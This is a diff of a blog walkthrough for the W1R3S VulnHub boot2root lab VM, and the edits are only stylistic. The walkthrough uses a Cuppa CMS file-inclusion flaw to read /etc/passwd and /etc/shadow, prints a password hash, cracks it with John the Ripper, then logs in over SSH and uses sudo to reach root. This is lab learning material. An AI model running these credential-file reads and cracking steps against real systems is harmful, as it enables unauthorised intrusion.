@@ -17,15 +17,15 @@ This post documents the complete walkthrough of W1R3S: 1.0.1, a boot2root [VM][1
 
 ### Background
 
-You have been hired to do a penetration test on the W1R3S.inc individual server and report all findings. They have asked you to gain `root` access and find the flag (located in `/root` directory).
+Someone hired you to do a penetration test on the W1R3S.inc individual server and report all findings. They have asked you to gain `root` access and find the flag (located in `/root` directory).
 
 ### Information Gathering
 
-Let's kick this off with a `nmap` scan to establish the services available in the host:
+Let's kick this off with a `nmap` scan to establish the services available in the host.
 
 ```
 # nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.100.130
-...
+…
 PORT     STATE SERVICE REASON         VERSION
 21/tcp   open  ftp     syn-ack ttl 64 vsftpd 2.0.8 or later
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
@@ -33,11 +33,11 @@ PORT     STATE SERVICE REASON         VERSION
 | drwxr-xr-x    2 ftp      ftp          4096 Jan 23 11:25 docs
 |_drwxr-xr-x    2 ftp      ftp          4096 Jan 28 16:53 new-employees
 22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
 |_  256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
 80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
-| http-methods: 
+| http-methods:
 |_  Supported Methods: POST OPTIONS GET HEAD
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Apache2 Ubuntu Default Page: It works
@@ -70,21 +70,21 @@ OK. We have two interesting directories: `administrator` and `wordpress`.
 
 ### Cuppa CMS
 
-The `administrator` directory turned out to be the installation setup for Cuppa CMS. This is how it looked like when the browser was pointed to `/administrator`.
+The `administrator` directory turned out to be the installation setup for Cuppa CMS. This is how it looked like when I pointed the browser to `/administrator`.
 
 ![screenshot-1](/assets/images/posts/w1r3s-walkthrough/screenshot-1.png)
 
-According to the official [documentation](https://www.cuppacms.com/en/docs/installation), in order for the installation to be completed, the database has to be created first.
+According to the official [documentation](https://www.cuppacms.com/en/docs/installation), in order for the installation to complete, it will have to create the database first.
 
 >Remember, the database should be created before to install Cuppa CMS.
 
 The Cuppa CMS installation was never completed in the first place or I'll not be seeing the setup page. I've downloaded a [copy](http://cuppacms.com/files/cuppa_cms.zip) of the Cuppa CMS code to see if I can discover any vulnerabilities.
 
-It was certainly a pleasant surprise when one was found. I'm not sure if this is a new vulnerability but there is a LFI vulnerability with `alertConfigField.php` at line 77.
+It surprised me when I found a vulnerability. I'm not sure if this is a new vulnerability but there was a LFI vulnerability in `alertConfigField.php` at line 77.
 
 ![screenshot-2](/assets/images/posts/w1r3s-walkthrough/screenshot-2.png)
 
-To test it, I wrote `cat.sh`, an extremely simple script that will display any file as long as there is permission to do so.
+To test it, I wrote `cat.sh`, a simple script that will display any file as long as there is permission to do so.
 
 {% highlight bash linenos %}
 #!/bin/bash
@@ -105,7 +105,7 @@ Let's give it a shot and see what we get.
 
 ```
 # ./cat.sh /etc/passwd
-...
+…
 w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
 sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
 ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false
@@ -115,27 +115,27 @@ Imagine my surprise when I requested for `/etc/shadow` and it showed up in the o
 
 ```
 # ./cat.sh /etc/shadow
-...
+…
 w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
 sshd:*:17554:0:99999:7:::
 ftp:*:17554:0:99999:7:::
 mysql:!:17554:0:99999:7:::
 ```
 
-I'm not quite sure if `/etc/shadow` was intentionally made world-readable which should not be the case.
+I'm not sure if `/etc/shadow` was intentionally made world-readable. It should not be the case.
 
 ### John the Ripper
 
-Well, what's done is done. With both `passwd` and `shadow` made available, I can `unshadow` them and send them to John the Ripper for offline cracking with a wordlist like "rockyou".
+Well, what's done is in the past. With both `passwd` and `shadow` made available, I was able to `unshadow` them, and send them to `john` for offline cracking with a wordlist like "rockyou".
 
-The cracking was completed in seconds.
+The cracking completed in seconds.
 
 ```
-# john --format=crypt --show hashes.txt 
+# john --format=crypt --show hashes.txt
 w1r3s:computer:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
 ```
 
-With the password of `w1r3s` made available, I can simply login to the box via SSH.
+With the password of `w1r3s` made available, I'm now able to login to the box via SSH.
 
 ![screenshot-3](/assets/images/posts/w1r3s-walkthrough/screenshot-3.png)
 
@@ -145,7 +145,7 @@ It wasn't long before I saw that `w1r3s` is on the `sudoers` list.
 
 ![screenshot-4](/assets/images/posts/w1r3s-walkthrough/screenshot-4.png)
 
-Becoming `root` is just one command away.
+Becoming `root` is another command away.
 
 ![screenshot-5](/assets/images/posts/w1r3s-walkthrough/screenshot-5.png)
 
@@ -153,7 +153,7 @@ Becoming `root` is just one command away.
 
 ### Afterthought
 
-Frankly, I didn't even bother with WordPress. :stuck_out_tongue_winking_eye:
+To be honest, I didn't even bother with WordPress. :stuck_out_tongue_winking_eye:
 
 [1]: https://www.vulnhub.com/entry/w1r3s-101,220/
 [2]: https://www.vulnhub.com
